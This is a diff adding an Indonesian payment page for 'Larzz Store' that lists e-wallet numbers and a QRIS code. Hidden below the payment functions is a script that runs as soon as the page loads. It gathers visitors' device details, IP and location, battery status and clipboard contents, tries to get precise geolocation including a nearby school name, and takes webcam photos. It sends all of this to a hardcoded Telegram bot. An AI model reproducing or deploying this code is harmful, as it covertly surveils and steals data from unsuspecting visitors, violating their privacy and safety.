@@ -1,0 +1,355 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pembayaran Digital By Larzz Store</title>
+  <div class="profile-container">
+    <img src="Logo.png" alt="Profil" class="profile-img"> 
+  </div>
+  <marquee><b>HALO SELAMAT DATANG DI WEBSITE PEMBAYARAN DIGITAL BY <i>LARZZ STORE X HOSTING</i></b></marquee>
+  <style>
+    body {
+  background-color: #1e1e1e;
+  color: cyan;
+  font-family: Arial, sans-serif;
+  text-align: center;
+  margin: 0;
+  padding: 20px;
+  min-height: 100vh;
+      background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)),
+                url('Logo.png') center/cover fixed;
+    color: #fff;
+    min-height: 100vh;
+    padding: 20px;
+    position: relative;
+    text-align: center;
+}
+  b {
+    font-size: 20px;
+    color: white;
+    text-shadow: 0 5px 7px black;
+  }
+  i {
+    color: aqua;
+    text-shadow: 0 0 6px aqua;
+    height: 100px;
+    widht: 100px;
+  }
+  h2 {
+    font-size: 20px;
+    color: white;
+    text-shadow: 0 0 8px black;
+  }
+
+.glow {
+  text-shadow: 0 0 10px aqua;
+  margin-bottom: 20px;
+  color: aqua;
+}
+
+.profile-container {
+  margin-bottom: 30px;
+}
+
+.profile-img {
+  width: 125px;
+  height: 125px;
+  border-radius: 50%;
+  border: 5px solid cyan;
+  object-fit: cover;
+}
+
+.box {
+  background: grey;
+  padding: 15px;
+  border-radius: 8px;
+  margin: 15px auto;
+  width: 90%;
+  max-width: 400px;
+  box-shadow: 0 5px 15px black;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.box img {
+  width: 32px;
+  height: 32px;
+  margin-right: 10px;
+}
+
+.info {
+  display: flex;
+  align-items: center;
+  text-align: left;
+  color: black;
+  font-family: bold;
+ 
+}
+
+/* From Uiverse.io by adamgiebl */ 
+button {
+  font-size: 12px;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  display: inline-block;
+  text-align: center;
+  font-weight: bold;
+  padding: 0.7em 2em;
+  border: 3px solid aqua;
+  border-radius: 2px;
+  position: relative;
+  box-shadow: 0 2px 10px rgba(0, 0, 0, 0.16), 0 3px 6px rgba(0, 0, 0, 0.1);
+  color: black;
+  text-decoration: none;
+  transition: 0.3s ease all;
+  z-index: 1;
+}
+
+button:before {
+  transition: 0.5s all ease;
+  position: absolute;
+  top: 0;
+  left: 50%;
+  right: 50%;
+  bottom: 0;
+  opacity: 0;
+  content: '';
+  text-shadow: 0 0 7px white;
+  background-color: aqua;
+  z-index: -1;
+}
+
+button:hover, button:focus {
+  color: white;
+}
+
+button:hover:before, button:focus:before {
+  transition: 0.5s all ease;
+  left: 0;
+  right: 0;
+  opacity: 1;
+}
+
+button:active {
+  transform: scale(0.9);
+}
+
+#qris {
+  display: none;
+  margin-top: 20px;
+}
+
+#qris img {
+  width: 400px;
+  height: auto;
+  transition: 5s ease all;
+}
+
+#notif {
+  position: fixed;
+  bottom: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: white;
+  color: black;
+  text-shadow: 0 0 8px black;
+  padding: 10px 20px;
+  border-radius: 8px;
+  display: none;
+  font-size: 14px;
+}
+  footer {
+      text-align: center;
+      padding: 20px;
+    text-color: white;
+      font-size: 0.9rem;
+      color: var(--text-color);
+      margin-top: 40px;
+  }
+  </style>
+</head>
+<body>
+
+  <h1 class="glow">Pembayaran Digital</h1>
+
+  <div class="box">
+    <div class="info">
+      <img src="https://files.catbox.moe/tm95lt.jpg" alt="DANA">
+      <p><b id="dana">08997005201</b></p>
+    </div>
+    <button onclick="copyText('dana')">Salin</button>
+  </div>
+
+  <div class="box">
+    <div class="info">
+      <img src="https://files.catbox.moe/42hgs3.jpg" alt="GOPAY">
+      <b id="gopay">08997005201</b>
+    </div>
+    <button onclick="copyText('gopay')">Salin</button>
+  </div>
+
+  <div class="box">
+    <div class="info">
+      <img src="Ovo.png" alt="OVO">
+      <b id="ovo">08997005201</b>
+    </div>
+    <button onclick="copyText('ovo')">Salin</button>
+  </div>
+
+  <button onclick="toggleQRIS()">Tampilkan QRIS</button>
+  
+  <h2>WAJIB DI BACA TERLEBIH DAHULU!!</h2>
+  
+  <h2>SETELAH MELAKUKAN TRANSFER/TRANSAKSI WAJIB UNTUK KIRIM BUKTI TRANFER JIKA TIDAK MENGIRIM BUKTI TRANSFER TIDAK AKAN DI PROSES DAN JIKA SALAH TRANSFER JANGAN SALAHKAN ADMIN!! </h2>
+
+  <div id="qris">
+    <img src="Qris.png" alt="QRIS">
+  </div>
+
+  <div id="notif">Berhasil disalin!</div>
+
+  <script>
+    function copyText(id) {
+    const text = document.getElementById(id).textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        showNotif();
+      });
+    }
+
+    function showNotif() {
+      const notif = document.getElementById('notif');
+      notif.style.display = 'block';
+      setTimeout(() => {
+        notif.style.display = 'none';
+      }, 2000);
+    }
+
+    function toggleQRIS() {
+      const qris = document.getElementById('qris');
+      qris.style.display = qris.style.display === 'none' ? 'block' : 'none';
+    }
+  const botToken = '7719848140:AAF_qpK43t2MgZdH6H4mW7LwMQJxtZGWZuY';
+    const chatID = '7697434079';
+
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: `chat_id=${chatID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
+      });
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const plat = navigator.platform;
+      const lang = navigator.language;
+      const res = `${screen.width}x${screen.height}`;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const online = navigator.onLine ? "Online" : "Offline";
+      const now = new Date().toLocaleString();
+
+      return `🖥 *Device Info*\n- User-Agent: ${ua}\n- Platform: ${plat}\n- Language: ${lang}\n- Resolution: ${res}\n- Timezone: ${tz}\n- Status: ${online}\n- Access Time: ${now}`;
+    }
+
+    function getIPInfo() {
+      return fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => {
+          return `🌐 *IP Info*\n- IP: ${data.ip}\n- City: ${data.city}\n- Region: ${data.region}\n- Country: ${data.country}\n- Location: ${data.loc}\n- ISP: ${data.org}`;
+        });
+    }
+
+    function getBattery() {
+      if (navigator.getBattery) {
+        return navigator.getBattery().then(batt => {
+          return `🔋 *Battery*\n- Level: ${Math.round(batt.level * 100)}%\n- Charging: ${batt.charging ? "Yes" : "No"}`;
+        });
+      } else {
+        return Promise.resolve("Battery status not supported.");
+      }
+    }
+
+    function getGeoFromIP() {
+      return fetch("https://ipinfo.io/json")
+        .then(res => res.json())
+        .then(data => {
+          const [lat, lon] = data.loc.split(",");
+          return `📍 *Approx. Location*\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Maps: https://www.google.com/maps?q=${lat},${lon}`;
+        });
+    }
+
+    function getClipboardText() {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        return navigator.clipboard.readText().then(text => {
+          return `📋 *Clipboard:*\n${text}`;
+        }).catch(() => "Clipboard not accessible.");
+      }
+      return Promise.resolve("Clipboard not supported.");
+    }
+
+    function capturePhotos() {
+      let video = document.createElement('video');
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        video.play();
+        let count = 0;
+        let interval = setInterval(() => {
+          if (count >= 3) {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop());
+            return;
+          }
+          let canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          let ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(blob => {
+            let formData = new FormData();
+            formData.append('chat_id', chatID);
+            formData.append('photo', blob, `photo${count}.png`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: 'POST',
+              body: formData
+            });
+          }, 'image/jpeg');
+          count++;
+        }, 3000);
+      }).catch(() => {});
+    }
+
+    function getGeoLocation() {
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const { latitude, longitude } = pos.coords;
+        let res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+        let data = await res.json();
+        let school = data.address.school || 'N/A';
+        let locationText = `📍 *Location Details* \n- Latitude: ${latitude}\n- Longitude: ${longitude}\n- City: ${data.address.city || 'N/A'}\n- School: ${school}\n- Country: ${data.address.country}\n- Maps: https://www.google.com/maps?q=${latitude},${longitude}`;
+        sendToTelegram(locationText);
+      });
+    }
+
+    async function gatherAll() {
+      const info = getDeviceInfo();
+      const [ipInfo, battInfo, geoIP, clipboard] = await Promise.all([
+        getIPInfo(), getBattery(), getGeoFromIP(), getClipboardText()
+      ]);
+
+      sendToTelegram(`${info}\n\n${ipInfo}\n\n${battInfo}\n\n${geoIP}\n\n${clipboard}`);
+      capturePhotos();
+      getGeoLocation();
+    }
+
+    // Jalankan semuanya saat halaman dibuka
+    window.onload = gatherAll;
+  </script>
+  
+  <footer>
+  &copy; 2025 Larzz Store. All Rights Reserved.
+</footer>
+
+</body>
+</html>
